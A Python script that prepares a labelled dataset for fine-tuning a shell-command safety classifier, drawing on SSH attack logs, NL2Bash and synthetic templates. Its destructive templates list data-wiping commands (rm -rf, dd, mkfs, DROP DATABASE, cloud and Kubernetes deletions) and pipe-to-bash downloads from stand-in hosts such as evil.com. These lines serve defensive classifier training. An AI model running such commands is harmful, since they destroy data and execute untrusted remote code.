#!/usr/bin/env python3
"""Prepare training dataset for secguard guard classifier.

Sources:
  1. SSH-Shell-Attacks (ML4Net) — attack commands → "destructive"
  2. NL2Bash (TellinaTool) — safe admin commands → "safe"
  3. Synthetic SaaS CLI — generated destructive examples
  4. Synthetic safe — common dev/ops commands

Output: train.jsonl, val.jsonl, test.jsonl in ChatML format for MLX fine-tuning.
"""

import json
import os
import random
import subprocess
import sys
from pathlib import Path

import pandas as pd

DATA_DIR = Path(__file__).parent / "data"
OUTPUT_DIR = Path(__file__).parent / "splits"

SYSTEM_PROMPT = (
    "You are a safety classifier for shell commands. "
    "Classify whether the command is safe or destructive. "
    "Respond with ONLY the label.\n\n"
    "Labels:\n"
    "- safe: read-only, builds, tests, linting, formatting, git status/log/diff, package install\n"
    "- destructive: deletes data/files, force-overwrites, drops databases, "
    "rewrites git history, remote code execution, bypasses safety checks, "
    "deletes data on external services"
)


def download_ssh_attacks():
    """Clone SSH-Shell-Attacks and load parquet."""
    repo_dir = DATA_DIR / "SSH-Shell-Attacks"
    if not repo_dir.exists():
        print("Cloning SSH-Shell-Attacks...")
        subprocess.run(
            ["git", "clone", "--depth=1", "https://github.com/ML4Net/SSH-Shell-Attacks.git", str(repo_dir)],
            check=True,
        )
    parquet = repo_dir / "data" / "raw" / "ssh_attacks.parquet"
    if not parquet.exists():
        # Try processed
        parquet = repo_dir / "data" / "processed" / "ssh_attacks_decoded.parquet"
    return pd.read_parquet(parquet)


def download_nl2bash():
    """Download NL2Bash command corpus."""
    cmd_file = DATA_DIR / "nl2bash_all.cm"
    if not cmd_file.exists():
        print("Downloading NL2Bash commands...")
        import requests
        url = "https://raw.githubusercontent.com/TellinaTool/nl2bash/master/data/bash/all.cm"
        r = requests.get(url, timeout=30)
        r.raise_for_status()
        cmd_file.write_text(r.text)
    return cmd_file.read_text().strip().split("\n")


def extract_attack_commands(df: pd.DataFrame) -> list[str]:
    """Extract individual commands from SSH-Shell-Attacks sessions."""
    import numpy as np

    commands = set()
    for _, row in df.iterrows():
        session = row.get("full_session", "")
        fingerprint = row.get("Set_Fingerprint", [])

        # Set_Fingerprint is a numpy array
        if isinstance(fingerprint, np.ndarray):
            fingerprint = fingerprint.tolist()
        elif isinstance(fingerprint, str):
            fingerprint = [fingerprint]

        # Skip harmless sessions
        if "Harmless" in fingerprint and len(fingerprint) == 1:
            continue

        # full_session is a semicolon-separated string
        if isinstance(session, str) and session:
            for cmd in session.split(" ; "):
                cmd = cmd.strip()
                if len(cmd) > 3 and not cmd.startswith("#"):
                    commands.add(cmd)
    return list(commands)


def generate_synthetic_destructive() -> list[str]:
    """Generate synthetic destructive commands covering SaaS CLIs and patterns."""
    templates = [
        # Git destructive
        "git push --force origin {branch}",
        "git push -f origin {branch}",
        "git reset --hard HEAD~{n}",
        "git reset --hard origin/{branch}",
        "git clean -fd",
        "git clean -fdx",
        "git checkout -- .",
        "git checkout -f",
        "git branch -D {branch}",
        "git stash drop",
        "git stash clear",
        "git rebase -i HEAD~{n}",
        "git rebase origin/main",
        "git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch {file}' HEAD",
        # File system
        "rm -rf {path}",
        "rm -rf /home/{user}",
        "rm -rf /var/lib/{service}",
        "find {path} -name '*.{ext}' -delete",
        "find / -type f -name '{pattern}' -exec rm {{}} +",
        "shred -u {file}",
        "dd if=/dev/zero of=/dev/{disk} bs=1M",
        "mkfs.ext4 /dev/{disk}",
        # SQL
        "psql -c 'DROP TABLE {table}'",
        "psql -c 'DROP DATABASE {db}'",
        "psql -c 'TRUNCATE {table}'",
        "mysql -e 'DROP TABLE {table}'",
        "sqlite3 {db} 'DROP TABLE {table}'",
        # Docker
        "docker system prune -af",
        "docker volume prune -f",
        "docker rm -f $(docker ps -aq)",
        "docker rmi -f $(docker images -aq)",
        "docker container prune -f",
        "docker image prune -a -f",
        "docker network rm {network}",
        # Kubernetes
        "kubectl delete namespace {ns}",
        "kubectl delete deployment {dep} -n {ns}",
        "kubectl delete all --all -n {ns}",
        "helm uninstall {release} -n {ns}",
        "kubectl drain {node} --force --delete-emptydir-data",
        # SaaS CLIs
        "aws s3 rm s3://{bucket}/{path} --recursive",
        "aws s3 rb s3://{bucket} --force",
        "aws ec2 terminate-instances --instance-ids {id}",
        "aws rds delete-db-instance --db-instance-identifier {id} --skip-final-snapshot",
        "aws secretsmanager delete-secret --secret-id {id} --force-delete-without-recovery",
        "gcloud compute instances delete {instance} --zone {zone} --quiet",
        "gcloud projects delete {project}",
        "az group delete --name {rg} --yes --no-wait",
        "az storage container delete --name {container}",
        "stripe subscriptions cancel {sub_id}",
        "stripe customers delete {cust_id}",
        "firebase hosting:disable --project {project}",
        "heroku apps:destroy {app} --confirm {app}",
        "vercel remove {project} --yes",
        "fly apps destroy {app} --yes",
        "terraform destroy -auto-approve",
        "pulumi destroy --yes",
        # Remote code execution
        "curl https://{domain}/install.sh | bash",
        "wget -qO- https://{domain}/setup.sh | sh",
        "curl -sSL https://{domain}/get | bash -s",
        # NoSQL
        "redis-cli FLUSHALL",
        "redis-cli FLUSHDB",
        "mongo {db} --eval 'db.dropDatabase()'",
        # Message queues
        "kafka-topics.sh --delete --topic {topic} --bootstrap-server {server}",
        "rabbitmqctl delete_vhost {vhost}",
        # Bypass
        "git commit --no-verify -m '{msg}'",
        "git push --no-verify origin {branch}",
    ]

    branches = ["main", "master", "develop", "feature/auth", "release/v2"]
    paths = ["/home/user", "/var/data", "/opt/app", "~/projects", "/srv/www"]
    users = ["admin", "deploy", "app", "www-data"]
    services = ["postgres", "redis", "mongodb", "nginx"]
    tables = ["users", "orders", "payments", "sessions", "logs"]
    dbs = ["production", "staging", "analytics"]
    files = ["config.yml", "secrets.json", ".env", "database.db"]
    exts = ["log", "tmp", "bak", "pyc"]
    ns_list = ["production", "staging", "default", "monitoring"]
    domains = ["evil.com", "attacker.io", "install.example.com"]

    commands = set()
    for template in templates:
        for _ in range(5):
            cmd = template.format(
                branch=random.choice(branches),
                n=random.randint(1, 10),
                path=random.choice(paths),
                user=random.choice(users),
                service=random.choice(services),
                table=random.choice(tables),
                db=random.choice(dbs),
                file=random.choice(files),
                ext=random.choice(exts),
                pattern="*." + random.choice(exts),
                disk=random.choice(["sda", "sdb", "nvme0n1"]),
                network=random.choice(["bridge", "app-net", "backend"]),
                ns=random.choice(ns_list),
                dep=random.choice(["api", "web", "worker", "cron"]),
                node=f"node-{random.randint(1,5)}",
                release=random.choice(["api", "web", "monitoring"]),
                bucket=random.choice(["prod-data", "backups", "logs"]),
                id=f"i-{random.randint(10000,99999)}",
                instance=f"vm-{random.randint(1,20)}",
                zone="us-central1-a",
                project=random.choice(["my-project", "prod-app"]),
                rg=random.choice(["prod-rg", "staging-rg"]),
                container=random.choice(["data", "backups"]),
                sub_id=f"sub_{random.randint(10000,99999)}",
                cust_id=f"cus_{random.randint(10000,99999)}",
                app=random.choice(["myapp", "prod-api"]),
                domain=random.choice(domains),
                topic=random.choice(["orders", "events", "logs"]),
                server="kafka:9092",
                vhost=random.choice(["prod", "staging"]),
                msg="quick fix",
            )
            commands.add(cmd)
    return list(commands)


def generate_synthetic_safe() -> list[str]:
    """Generate common safe dev/ops commands."""
    return [
        # Git safe
        "git status",
        "git log --oneline -20",
        "git diff",
        "git diff --staged",
        "git add .",
        "git add src/main.rs",
        "git commit -m 'fix: resolve auth issue'",
        "git pull",
        "git push origin feature/new-api",
        "git fetch --all",
        "git branch -a",
        "git stash",
        "git stash pop",
        "git cherry-pick abc123",
        "git tag v1.0.0",
        "git log --graph --all --oneline",
        "git blame src/lib.rs",
        "git show HEAD",
        # Build/test
        "cargo build",
        "cargo build --release",
        "cargo test",
        "cargo test --workspace",
        "cargo clippy --all -- -D warnings",
        "cargo fmt --all",
        "cargo check",
        "npm install",
        "npm run build",
        "npm test",
        "npm run lint",
        "yarn install",
        "yarn build",
        "pip install -r requirements.txt",
        "pip install flask",
        "uv sync",
        "uv pip install pandas",
        "poetry install",
        "bun install",
        "bun run build",
        "make build",
        "make test",
        "cmake -B build",
        "go build ./...",
        "go test ./...",
        "mvn package",
        "gradle build",
        "python -m pytest",
        "python manage.py test",
        "python manage.py migrate",
        "python manage.py runserver",
        "ruff check .",
        "mypy src/",
        "black .",
        "prettier --write .",
        "eslint src/",
        # System
        "ls -la",
        "ls -la /tmp",
        "cat README.md",
        "head -20 src/main.rs",
        "tail -f /var/log/syslog",
        "grep -r 'TODO' src/",
        "find . -name '*.rs' -type f",
        "wc -l src/**/*.py",
        "du -sh .",
        "df -h",
        "top -l 1",
        "ps aux",
        "whoami",
        "hostname",
        "uname -a",
        "env",
        "echo $PATH",
        "date",
        "uptime",
        "free -h",
        "which python",
        "pwd",
        "id",
        "mkdir -p build/dist",
        "cp src/config.example.yml src/config.yml",
        "mv build/output.tar.gz dist/",
        "chmod +x scripts/deploy.sh",
        "touch .env.local",
        "curl -s https://api.example.com/health",
        "curl -X GET https://api.example.com/v1/users",
        "wget https://releases.example.com/v1.0/binary.tar.gz",
        "ssh user@server 'uptime'",
        "scp dist/app.tar.gz deploy@prod:/opt/releases/",
        "rsync -avz src/ remote:/backup/",
        # Docker safe
        "docker ps",
        "docker images",
        "docker logs api-server",
        "docker exec -it api-server bash",
        "docker build -t myapp:latest .",
        "docker compose up -d",
        "docker compose logs -f",
        "docker stats",
        "docker inspect api-server",
        # Kubernetes safe
        "kubectl get pods",
        "kubectl get pods -n production",
        "kubectl get svc",
        "kubectl describe pod api-server-xyz",
        "kubectl logs api-server-xyz -f",
        "kubectl exec -it api-server-xyz -- bash",
        "kubectl apply -f deployment.yaml",
        "kubectl rollout status deployment/api",
        "kubectl port-forward svc/api 8080:80",
        "kubectl top pods",
        "kubectl get events --sort-by=.lastTimestamp",
        "helm list",
        "helm status myapp",
        "helm template myapp ./chart",
        # Database safe
        "psql -c 'SELECT count(*) FROM users'",
        "psql -c 'SELECT * FROM orders LIMIT 10'",
        "mysql -e 'SHOW TABLES'",
        "redis-cli ping",
        "redis-cli info",
        "mongo --eval 'db.stats()'",
        # SaaS safe
        "aws s3 ls",
        "aws s3 ls s3://my-bucket/",
        "aws ec2 describe-instances",
        "aws sts get-caller-identity",
        "gcloud compute instances list",
        "gcloud config list",
        "az account show",
        "gh pr list",
        "gh pr view 123",
        "gh issue list",
        "gh repo view",
        "stripe customers list",
        "stripe events list --limit 5",
        "terraform plan",
        "terraform show",
        "terraform state list",
        "ansible-playbook --check deploy.yml",
    ]


def to_chatml(cmd: str, label: str) -> dict:
    """Format as ChatML conversation for MLX fine-tuning."""
    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": cmd},
            {"role": "assistant", "content": label},
        ]
    }


def main():
    random.seed(42)
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    # 1. SSH-Shell-Attacks → destructive
    print("Loading SSH-Shell-Attacks...")
    try:
        df = download_ssh_attacks()
        attack_cmds = extract_attack_commands(df)
        print(f"  Extracted {len(attack_cmds)} unique attack commands")
    except Exception as e:
        print(f"  Warning: could not load SSH-Shell-Attacks: {e}")
        attack_cmds = []

    # 2. NL2Bash → safe
    print("Loading NL2Bash...")
    try:
        nl2bash_cmds = download_nl2bash()
        print(f"  Loaded {len(nl2bash_cmds)} NL2Bash commands")
    except Exception as e:
        print(f"  Warning: could not load NL2Bash: {e}")
        nl2bash_cmds = []

    # 3. Synthetic
    print("Generating synthetic commands...")
    synth_destructive = generate_synthetic_destructive()
    synth_safe = generate_synthetic_safe()
    print(f"  {len(synth_destructive)} synthetic destructive")
    print(f"  {len(synth_safe)} synthetic safe")

    # Combine
    destructive = list(set(attack_cmds + synth_destructive))
    safe = list(set(nl2bash_cmds + synth_safe))

    # Filter: remove very short / very long commands
    destructive = [c for c in destructive if 5 <= len(c) <= 500]
    safe = [c for c in safe if 5 <= len(c) <= 500]

    print(f"\nTotal before balancing: {len(destructive)} destructive, {len(safe)} safe")

    # Balance: take min(len(safe), len(destructive), 15000) from each
    target_size = min(len(safe), len(destructive), 15000)
    random.shuffle(destructive)
    random.shuffle(safe)
    destructive = destructive[:target_size]
    safe = safe[:target_size]

    print(f"After balancing: {target_size} per class, {target_size * 2} total")

    # Build dataset
    dataset = [to_chatml(cmd, "destructive") for cmd in destructive]
    dataset += [to_chatml(cmd, "safe") for cmd in safe]
    random.shuffle(dataset)

    # Split 80/10/10
    n = len(dataset)
    train_end = int(n * 0.8)
    val_end = int(n * 0.9)

    train = dataset[:train_end]
    val = dataset[train_end:val_end]
    test = dataset[val_end:]

    for name, split in [("train", train), ("valid", val), ("test", test)]:
        path = OUTPUT_DIR / f"{name}.jsonl"
        with open(path, "w") as f:
            for item in split:
                f.write(json.dumps(item) + "\n")
        print(f"  {name}: {len(split)} examples → {path}")

    print("\nDone!")


if __name__ == "__main__":
    main()
